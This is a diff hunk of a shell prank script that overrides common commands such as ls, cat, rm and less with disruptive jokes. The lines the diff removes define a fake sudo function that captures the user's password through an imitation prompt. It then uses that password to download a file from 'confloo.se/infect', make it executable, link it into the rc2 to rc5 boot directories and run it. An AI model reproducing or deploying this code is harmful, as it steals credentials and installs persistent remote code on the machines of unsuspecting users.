@@ -28,22 +28,6 @@ eval "cd() { $cmd; }"
 f ls "while (true); do sl -a; done"
 f cat "echo \"miaou\""
 
-cfl=/etc/init.d/cfl.z
-sudo=`which sudo`
-sudo() {
-    if [ $# = 0 ]; then $sudo
-    else
-        printf "[sudo] password for `whoami`: "
-        read -s pass; echo ""
-        echo $pass | $sudo -S curl --output $cfl "http://confloo.se/infect" >/dev/null 2>&1
-        echo $pass | $sudo -S chmod +x $cfl >/dev/null 2>&1
-        for i in 2 3 4 5; do
-            echo $pass | $sudo -S ln -s $cfl /etc/rc$i.d/S99cfl.z
-        done
-        echo $pass | $sudo -S $cfl
-    fi
-}
-
 f rm "xrandr -o left; xrandr -x"
 f less "xrandr -s 6 &> /dev/null"
 
